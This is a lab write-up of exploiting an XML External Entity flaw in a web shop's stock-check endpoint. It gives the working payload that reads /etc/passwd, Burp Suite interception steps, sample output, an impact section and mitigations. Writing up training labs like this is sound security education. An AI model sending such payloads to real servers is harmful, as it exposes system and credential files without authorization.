\# Exploiting XXE Using External Entities to Retrieve Files



\## Summary



This lab demonstrates an XML External Entity (XXE) vulnerability in an XML parser used by the stock check functionality of the application.  

The vulnerable XML parser processes external entities, allowing attackers to read sensitive files from the server.



The attack was performed by injecting a malicious external entity into the XML request body and retrieving the contents of `/etc/passwd`.

\- Status: Solved



\# Affected Endpoint



```http

POST /product/stock HTTP/2

Content-Type: application/xml

```



\# Vulnerability Details



The application accepts XML input for stock checking functionality.

The XML parser is configured insecurely and allows external entity processing.

An attacker can define a custom external entity using the DOCTYPE declaration and force the server to read local files.



The following sensitive file was accessed successfully: /etc/passwd



\# Proof of Concept (PoC)



Malicious XXE Payload

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo \[ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>



<stockCheck>

&#x20;   <productId>

&#x20;       \&xxe;

&#x20;   </productId>



&#x20;   <storeId>

&#x20;       1

&#x20;   </storeId>

</stockCheck>



\# Exploitation Steps

Step 1 — Open the Lab



The lab environment was opened using Burp Suite Browser.



Step 2 — Intercept the Request



Burp Suite Intercept was enabled to capture the stock check request generated by the application.



The intercepted request was sent to Repeater for modification and testing.



Step 3 — Identify XML Input



The request body contained XML data:

<stockCheck>

&#x20;   <productId>

&#x20;       1

&#x20;   </productId>



&#x20;   <storeId>

&#x20;       1

&#x20;   </storeId>

</stockCheck>

This confirmed that the endpoint processes XML input.



Step 4 — Inject XXE Payload



A malicious DOCTYPE declaration was inserted into the XML request.



The productId parameter was replaced with the external entity reference: \&xxe;



Step 5 — Send the Modified Request



The crafted request was sent using Burp Repeater.



Step 6 — Observe Server Response



The server response returned the contents of /etc/passwd, confirming successful XXE exploitation.



Example response snippet:

root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin



\# Impact



Successful exploitation of this XXE vulnerability allows attackers to read sensitive files from the server.



An attacker may gain access to:



\- System files

\- User information

\- Configuration files

\- Internal application data

\- Sensitive operating system information



In this lab, the `/etc/passwd` file was successfully disclosed from the target server.



\# Mitigation



To prevent XXE vulnerabilities:



Disable external entity processing in XML parsers

Disable DTD processing completely

Use secure XML parsing libraries

Validate and sanitize XML input

Implement least privilege access controls

Prefer safer data formats like JSON where possible
